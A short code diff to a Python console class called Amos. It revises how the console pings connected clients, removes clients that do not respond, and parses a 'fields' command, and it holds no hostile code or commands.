@@ -71,26 +71,30 @@ class Amos:
             cmd = input(self.convert_text("Amos: "))
 
             if cmd == 'connected':
-                #sends a check call to client
+                #sends a check call to all clients
                 cmd = cmd.strip().lower()
                 response = []
-                for client_ip, client_id in http_server.RequestHandlerClass.connected_clients.items():
-                    print(client_id, client_ip)
-                    check_call_response = http_server.RequestHandlerClass.send_check_call_command(http_server.RequestHandlerClass, client_ip)
-                   
-                    print("Check Call Response:" + str(check_call_response))
 
+                # Create a copy of the keys before iterating
+                client_ips = list(http_server.RequestHandlerClass.connected_clients.keys())
+                for client_ip in client_ips:
+                    check_call_response = http_server.RequestHandlerClass.send_check_call_command(http_server.RequestHandlerClass, client_ip)
+                    
                     if check_call_response:
                         response.append(self.esHandler.retrieve_connected_clients(client_ip))
-
                     else:
-                        print("no response")
+                        if client_ip in http_server.RequestHandlerClass.connected_clients:
+                            http_server.RequestHandlerClass.connected_clients.pop(client_ip, None)
+                            print(f"[-] No response from client with IP: {client_ip}")
 
+                # Check if the response is not empty before processing
+                if response:
+                    self.esHandler.tabulate_data(response)
+                    response.clear()
+                else:
+                    print("[-] No clients connected!!!.")
 
-                self.esHandler.tabulate_data(response)
-                response.clear()
-                    
-                    
+                   
             elif cmd.strip() == "":
                 pass 
 
@@ -139,9 +143,9 @@ class Amos:
             elif cmd.startswith('fields'):
                 cmd = cmd.split()
 
-                if len(cmd) == 4:
-                    client_id = cmd[2]
-                    feild_parameter= cmd[3]
+                if len(cmd) == 3:
+                    client_id = cmd[1]
+                    feild_parameter= cmd[2]
                     self.esHandler.get_field(client_id, feild_parameter)
                 else:
                     print("[-]Invalid input!!!")
@@ -163,7 +167,6 @@ class Amos:
 
 
     def start(self):
-
         # Start the HTTP server in a separate thread
         server_thread = threading.Thread(target=self.server.serve_forever)
         server_thread.daemon = True
